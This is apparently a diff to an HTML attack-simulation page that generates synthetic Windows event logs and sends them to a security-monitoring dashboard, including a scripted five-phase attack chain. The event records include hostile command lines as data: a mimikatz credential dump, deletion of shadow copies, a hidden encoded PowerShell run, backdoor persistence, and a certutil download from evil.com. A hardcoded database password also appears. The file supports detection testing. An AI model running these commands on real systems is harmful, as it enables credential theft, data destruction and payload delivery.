+    label:'Mimikatz',
+    build: ()=>[{
+      event_id:4688, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A new process has been created.',
+      process_name:'mimikatz.exe',
+      data:{SubjectUserName:'jsmith',NewProcessName:'C:\\temp\\mimikatz.exe',
+            CommandLine:'mimikatz.exe sekurlsa::logonpasswords',ParentProcessName:'cmd.exe'}
+    }]
+  },
+  shadowcopy: {
+    label:'Shadow Copy Deletion',
+    build: ()=>[{
+      event_id:4688, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A new process has been created.',
+      process_name:'cmd.exe',
+      data:{SubjectUserName:'SYSTEM',
+            CommandLine:'cmd.exe /c vssadmin delete shadows /all /quiet',
+            NewProcessName:'C:\\Windows\\System32\\cmd.exe'}
+    }]
+  },
+  logcleared: {
+    label:'Log Cleared',
+    build: ()=>[{
+      event_id:1102, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'The audit log was cleared.',
+      data:{SubjectUserName:'administrator',SubjectDomainName:'TESTDOMAIN'}
+    }]
+  },
+  powershell: {
+    label:'PowerShell Encoded',
+    build: ()=>[{
+      event_id:4688, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A new process has been created.',
+      process_name:'powershell.exe',
+      data:{SubjectUserName:'jsmith',
+            NewProcessName:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+            CommandLine:'powershell.exe -NoP -NonI -W Hidden -enc JABjAGwAaQBlAG4AdAA=',
+            ParentProcessName:'explorer.exe'}
+    }]
+  },
+  psexec: {
+    label:'PsExec',
+    build: ()=>[{
+      event_id:7045, channel:'System', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Service Control Manager',
+      message:'A service was installed in the system.',
+      service_name:'PSEXESVC',
+      data:{ServiceName:'PSEXESVC',ImagePath:'%SystemRoot%\\PSEXESVC.exe',
+            ServiceType:'user mode service',StartType:'demand start',AccountName:'LocalSystem'}
+    }]
+  },
+  newservice: {
+    label:'New Service',
+    build: ()=>[{
+      event_id:7045, channel:'System', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Service Control Manager',
+      message:'A service was installed in the system.',
+      service_name:'EvilPersistenceService',
+      data:{ServiceName:'EvilPersistenceService',
+            ImagePath:'C:\\Users\\Public\\backdoor.exe',
+            ServiceType:'kernel driver',StartType:'auto start',AccountName:'LocalSystem'}
+    }]
+  },
+  addedtoadmins: {
+    label:'Added to Admins',
+    build: ()=>[{
+      event_id:4732, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A member was added to a security-enabled local group.',
+      data:{SubjectUserName:'administrator',MemberName:'CN=jsmith',TargetUserName:'Administrators',
+            TargetSid:'S-1-5-32-544'}
+    }]
+  },
+  scheduledtask: {
+    label:'Scheduled Task',
+    build: ()=>[{
+      event_id:4698, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A scheduled task was created.',
+      task_name:'\\Microsoft\\Windows\\MaliciousTask',
+      data:{SubjectUserName:'jsmith',
+            TaskName:'\\Microsoft\\Windows\\MaliciousTask',
+            TaskContent:'<Actions><Exec><Command>C:\\temp\\backdoor.exe</Command></Exec></Actions>'}
+    }]
+  },
+  rdp: {
+    label:'RDP Logon',
+    build: ()=>[{
+      event_id:4624, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'An account was successfully logged on.',
+      data:{SubjectUserName:'-',TargetUserName:'administrator',LogonType:'10',
+            IpAddress:'203.0.113.55',LogonProcessName:'User32'}
+    }]
+  },
+  accountlockout: {
+    label:'Account Lockout',
+    build: ()=>[{
+      event_id:4740, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A user account was locked out.',
+      data:{TargetUserName:'jsmith',SubjectUserName:'Administrator',CallerComputerName:'WORKSTATION-02'}
+    }]
+  },
+  newuser: {
+    label:'New User',
+    build: ()=>[{
+      event_id:4720, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A user account was created.',
+      data:{SubjectUserName:'administrator',TargetUserName:'h4ck3r99',
+            SamAccountName:'h4ck3r99',DisplayName:'Hacker Account'}
+    }]
+  },
+  certutil: {
+    label:'Certutil Abuse',
+    build: ()=>[{
+      event_id:4688, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A new process has been created.',
+      process_name:'certutil.exe',
+      data:{SubjectUserName:'jsmith',
+            NewProcessName:'C:\\Windows\\System32\\certutil.exe',
+            CommandLine:'certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe'}
+    }]
+  },
+  whoami: {
+    label:'Recon - whoami',
+    build: ()=>[{
+      event_id:4688, channel:'Security', timestamp:ts(),
+      computer:'SIMULATOR-01', provider:'Microsoft-Windows-Security-Auditing',
+      message:'A new process has been created.',
+      process_name:'whoami.exe',
+      data:{SubjectUserName:'jsmith',NewProcessName:'C:\\Windows\\System32\\whoami.exe',
+            CommandLine:'whoami /all',ParentProcessName:'cmd.exe'}
+    }]
+  },
+};
+
+// ── Fire single attack ─────────────────────────────────────────────────────
+async function fireAttack(type) {
+  if (!connected()) { addLog('err','⚠️','Not connected — click Connect & Setup first.'); return; }
+  const atk = ATTACKS[type]; if (!atk) return;
+
+  // Find the card
+  const cards = document.querySelectorAll('.attack-card');
+  let card = null;
+  const attrMap = {bruteforce:0,mimikatz:1,shadowcopy:2,logcleared:3,powershell:4,psexec:5,newservice:6,addedtoadmins:7,scheduledtask:8,rdp:9,accountlockout:10,newuser:11,certutil:12,whoami:13};
+  card = cards[attrMap[type]];
+
+  card?.classList.add('loading');
+  setStatus('busy','Sending events…');
+
+  try {
+    const events = atk.build();
+    const result = await sendEvents(events);
+    card?.classList.remove('loading');
+    showCardResult(card, true, `✅ Sent! ${result.accepted} event${result.accepted!==1?'s':''} accepted`);
+    addLog('ok','⚡',`<strong>${atk.label}</strong> fired — <span class="ev-count">${result.accepted} events</span> accepted. Check dashboard in ~30 seconds.`);
+    setStatus('ok','Events sent');
+  } catch(e) {
+    card?.classList.remove('loading');
+    showCardResult(card, false, '❌ ' + e.message);
+    addLog('err','❌',`<strong>${atk.label}</strong> failed: ${e.message}`);
+    setStatus('err','Send failed');
+  }
+  setTimeout(()=>setStatus('ok','Connected & Ready'), 3000);
+}
+
+function showCardResult(card, ok, msg) {
+  if (!card) return;
+  const res = card.querySelector('.card-result');
+  const ico = res.querySelector('.result-icon');
+  const txt = res.querySelector('.result-msg');
+  ico.textContent = ok ? '✅' : '❌';
+  txt.textContent = msg;
+  txt.className = 'result-msg ' + (ok?'ok':'err');
+  res.classList.add('show');
+  setTimeout(()=>res.classList.remove('show'), 2500);
+}
+
+// ── Full attack chain scenario ─────────────────────────────────────────────
+async function runFullScenario() {
+  if (!connected()) return;
+  const btn = document.getElementById('scenarioBtn');
+  const pw = document.getElementById('scenarioProgress');
+  const fill = document.getElementById('progressFill');
+  const label = document.getElementById('progressLabel');
+  const pct = document.getElementById('progressPct');
+  btn.disabled = true;
+  pw.style.display = 'block';
+  setStatus('busy','Running full scenario…');
+  addLog('info','🎭','<strong>Full Attack Chain started</strong> — 5 phases running…');
+
+  const steps = [
+    {key:'bruteforce', label:'Phase 1/5 — Brute Force', pct:20},
+    {key:'mimikatz',   label:'Phase 2/5 — Credential Dump', pct:40},
+    {key:'psexec',     label:'Phase 3/5 — Lateral Movement', pct:60},
+    {key:'shadowcopy', label:'Phase 4/5 — Ransomware Prep', pct:80},
+    {key:'logcleared', label:'Phase 5/5 — Cover Tracks', pct:100},
+  ];
+
+  for (const step of steps) {
+    label.textContent = step.label;
+    pct.textContent = step.pct + '%';
+    fill.style.width = step.pct + '%';
+    try {
+      const events = ATTACKS[step.key].build();
+      const r = await sendEvents(events);
+      addLog('ok','✓',`${step.label}: <span class="ev-count">${r.accepted} events</span>`);
+    } catch(e) {
+      addLog('err','✗',`${step.label} failed: ${e.message}`);
+    }
+    await new Promise(res=>setTimeout(res, 1500));
+  }
+
+  label.textContent = '✅ Complete!';
+  setStatus('ok','Scenario complete');
+  addLog('ok','🏁','<strong>Full attack chain complete.</strong> Open the dashboard to see 5+ incidents appearing.');
+  setTimeout(()=>{
+    btn.disabled=false; pw.style.display='none'; fill.style.width='0%';
+    setStatus('ok','Connected & Ready');
+  }, 4000);
+}
+
+// ── Quick actions ──────────────────────────────────────────────────────────
+function openDashboard() { window.open(WT_URL+'/dashboard/incidents','_blank'); }
+async function resetData() {
+  if (!confirm('This will delete all events and incidents from SIMULATOR-01. Continue?')) return;
+  if (!connected()) { addLog('err','⚠️','Not connected.'); return; }
+  // We can't directly call MongoDB, but we can notify the user
+  addLog('info','ℹ️','To reset test data, run this in PowerShell: <strong>docker exec watchtower_mongodb mongosh "mongodb://watchtower_user:watchtowerpass@localhost:27017/watchtower" --eval "db.events.deleteMany({hostname:{\\$regex:\'SIMULATOR\'}}); db.incidents.deleteMany({hostname:{\\$regex:\'SIMULATOR\'}})"</strong>');
+}
+</script>
+</body>
+</html>
